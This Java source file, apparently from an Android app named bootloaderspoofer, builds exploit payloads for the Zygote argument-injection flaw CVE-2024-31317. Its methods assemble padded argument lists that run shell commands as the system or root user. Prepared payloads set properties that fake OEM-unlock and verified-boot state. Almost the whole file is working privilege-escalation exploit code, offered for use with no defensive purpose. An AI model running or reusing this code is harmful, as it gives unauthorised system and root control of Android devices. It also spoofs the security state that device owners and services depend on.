package com.takattowo.bootloaderspoofer;

import android.os.Build;
import android.util.Log;

import java.util.Arrays;

/**
 * Builds CVE-2024-31317 Zygote injection payloads.
 *
 * Adapted from procdev (vortexdigitalera/procdev) — ZygoteArguments + ZygoteFragment
 * payload generation logic. This vulnerability allows injecting arguments into the
 * Zygote process via the {@code hidden_api_blacklist_exemptions} Settings.Global key.
 *
 * <p>The payload is written to Settings.Global, then the Settings app is launched.
 * When Settings reads the value, the Zygote forks a new process with the injected
 * arguments — giving us SYSTEM-level (uid 1000) privileges, which can manipulate
 * {@code ro.oem.*} and bootloader properties that even root cannot easily change.
 *
 * <p>The payload format is a newline-delimited argument list:
 * <pre>
 * 8                          ← argument count
 * --setuid=1000              ← target UID (1000 = system)
 * --setgid=1000              ← target GID
 * --runtime-args
 * --seinfo=platform          ← SELinux info
 * --runtime-flags=0
 * --nice-name=system_server
 * --invoke-with              ← the command to execute
 * /system/bin/sh -c '...'    ← actual shell command
 * </pre>
 */
final class ZygotePayloadBuilder {

    private static final String TAG = "ZygotePayloadBuilder";

    /** Default argument count for the Zygote payload. */
    private static final int DEFAULT_CALCULATE = 8;

    // Zygote argument constants (from procdev ZygoteArguments)
    private static final String ARG_CALCULATE = DEFAULT_CALCULATE + "\n";
    private static final String ARG_SET_UID = "--setuid=\n";
    private static final String ARG_SET_GID = "--setgid=\n";
    private static final String ARG_RUNTIME_ARGS = "--runtime-args\n";
    private static final String ARG_SEINFO = "--seinfo=\n";
    private static final String ARG_RUNTIME_FLAGS = "--runtime-flags=";
    private static final String ARG_PROC_NAME = "--nice-name=";
    private static final String ARG_INVOKE_WITH = "--invoke-with\n";

    // Default padding for Android 12-13 compatibility
    private static final int DEFAULT_ZYG1 = 5;  // newline padding before payload
    private static final int DEFAULT_ZYG2 = 0;   // 'A' character padding
    private static final int DEFAULT_ZYG3 = 4;   // comma padding after payload

    /** Target UIDs for privilege escalation. */
    static final int UID_SYSTEM = 1000;   // system_server / system UID
    static final int UID_ROOT = 0;        // root
    static final int UID_SHELL = 2000;    // shell/adb

    private ZygotePayloadBuilder() {}

    /**
     * Build a payload that executes a shell command with the given UID/GID.
     *
     * @param uid         Target UID (e.g. 1000 for system, 0 for root)
     * @param gid         Target GID
     * @param seInfo      SELinux info string (e.g. "platform", "default")
     * @param niceName    Process name (e.g. "system_server")
     * @param runtimeFlags Runtime flags (usually 0)
     * @param command     Shell command to execute via --invoke-with
     * @return The complete payload string, or null on failure
     */
    static String buildPayload(int uid, int gid, String seInfo, String niceName,
                               String runtimeFlags, String command) {
        try {
            StringBuilder payload = new StringBuilder();

            // Padding for Android 12-13 compatibility
            // These newlines/characters are needed to align the payload
            // with the Zygote's argument parser on newer Android versions
            int zyg1Count = DEFAULT_ZYG1;
            int zyg2Count = DEFAULT_ZYG2;
            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R) {
                // Use defaults for Android 12+
            }

            // Newline padding
            for (int i = 0; i < zyg1Count; i++) {
                payload.append("\n");
            }

            // Character padding
            char[] padding = new char[zyg2Count];
            Arrays.fill(padding, 'A');
            payload.append(padding);

            // Build the argument list
            payload.append(ARG_CALCULATE)
                    .append(ARG_SET_UID)
                    .append(ARG_SET_GID)
                    .append(ARG_RUNTIME_ARGS)
                    .append(ARG_SEINFO)
                    .append(ARG_RUNTIME_FLAGS).append(runtimeFlags != null ? runtimeFlags : "0").append("\n")
                    .append(ARG_PROC_NAME).append(niceName != null ? niceName : "system_server").append("\n")
                    .append(ARG_INVOKE_WITH);

            // Now replace the parameter placeholders with actual values
            String result = payload.toString();
            result = replaceParameter(result, "--setuid=", String.valueOf(uid));
            result = replaceParameter(result, "--setgid=", String.valueOf(gid));
            if (seInfo != null && !seInfo.isEmpty()) {
                result = replaceParameter(result, "--seinfo=", seInfo);
            }

            // Append the actual command after --invoke-with
            result += command;

            // Append buffer padding (commas + X) to satisfy the parser
            result += getPayloadBuffer();

            return result;
        } catch (Exception e) {
            Log.e(TAG, "Failed to build payload", e);
            return null;
        }
    }

    /**
     * Build a payload for system-level (UID 1000) privilege escalation.
     * This gives us system_server privileges, enough to manipulate OEM properties.
     */
    static String buildSystemPayload(String command) {
        return buildPayload(UID_SYSTEM, UID_SYSTEM, "platform", "system_server", "0", command);
    }

    /**
     * Build a payload for root (UID 0) privilege escalation.
     */
    static String buildRootPayload(String command) {
        return buildPayload(UID_ROOT, UID_ROOT, "default", "root_process", "0", command);
    }

    /**
     * Build a payload that writes a system property using system privileges.
     * This is the key function for OEM unlock — it sets ro.oem.* properties
     * that control bootloader unlock capability.
     *
     * @param propName  Property name (e.g. "ro.oem_unlock_supported")
     * @param propValue Property value (e.g. "1")
     * @return Payload string
     */
    static String buildPropertyWritePayload(String propName, String propValue) {
        // Use setprop via the property service directly
        // With system UID, we can write to ro.* properties
        String command = "/system/bin/setprop " + propName + " " + propValue;
        return buildSystemPayload(command);
    }

    /**
     * Build a payload that executes a settings command with system privileges.
     * This can change Settings.Global values that require system UID.
     */
    static String buildSettingsPayload(String namespace, String key, String value) {
        String command = "/system/bin/settings put " + namespace + " " + key + " " + value;
        return buildSystemPayload(command);
    }

    /**
     * Build a payload that enables OEM unlocking at the system level.
     * This sets multiple properties and settings that control unlock capability.
     */
    static String buildOemUnlockPayload() {
        // Chain multiple commands to enable OEM unlock
        // With system UID, we can write to ro.oem.* and persistent properties
        String command = "/system/bin/sh -c '" +
                "settings put global oem_unlock_enabled 1; " +
                "setprop persist.sys.oem_unlock_allowed 1; " +
                "setprop ro.oem_unlock_supported 1; " +
                "setprop persist.sys.oem_unlock_supported 1; " +
                "setprop ro.boot.flash.locked 0; " +
                "setprop ro.boot.verifiedbootstate orange; " +
                "setprop sys.oem_unlock_allowed 1" +
                "'";
        return buildSystemPayload(command);
    }

    /**
     * Build a payload that disables OEM unlocking (re-lock simulation).
     */
    static String buildOemLockPayload() {
        String command = "/system/bin/sh -c '" +
                "settings put global oem_unlock_enabled 0; " +
                "setprop persist.sys.oem_unlock_allowed 0; " +
                "setprop ro.boot.flash.locked 1; " +
                "setprop ro.boot.verifiedbootstate green" +
                "'";
        return buildSystemPayload(command);
    }

    /**
     * Get the payload buffer (trailing commas + X) for parser compatibility.
     */
    private static String getPayloadBuffer() {
        char[] commas = new char[DEFAULT_ZYG3];
        Arrays.fill(commas, ',');
        return " #" + new String(commas) + "X";
    }

    /**
     * Replace a parameter value in the payload string.
     * Finds the parameter name and replaces everything after it up to the
     * next newline (for DIGITS type) or next whitespace (for NON_SPACE type).
     */
    private static String replaceParameter(String text, String paramName, String newValue) {
        StringBuilder result = new StringBuilder();
        int lastIndex = 0;
        int paramLen = paramName.length();

        while (true) {
            int paramIndex = findExactParameter(text, paramName, lastIndex);
            if (paramIndex == -1) {
                result.append(text, lastIndex, text.length());
                break;
            }

            result.append(text, lastIndex, paramIndex + paramLen);
            result.append(newValue);

            // Skip the old value (up to next newline)
            int valueEnd = paramIndex + paramLen;
            while (valueEnd < text.length() && text.charAt(valueEnd) != '\n') {
                valueEnd++;
            }
            lastIndex = valueEnd;
        }

        return result.toString();
    }

    /**
     * Find an exact parameter match (preceded by whitespace or start of string).
     */
    private static int findExactParameter(String text, String param, int fromIndex) {
        int index = fromIndex;
        while (index < text.length()) {
            int found = text.indexOf(param, index);
            if (found == -1) return -1;

            // Check it's an exact match (preceded by whitespace or newline)
            if (found == 0 || Character.isWhitespace(text.charAt(found - 1))) {
                return found;
            }
            index = found + 1;
        }
        return -1;
    }
}
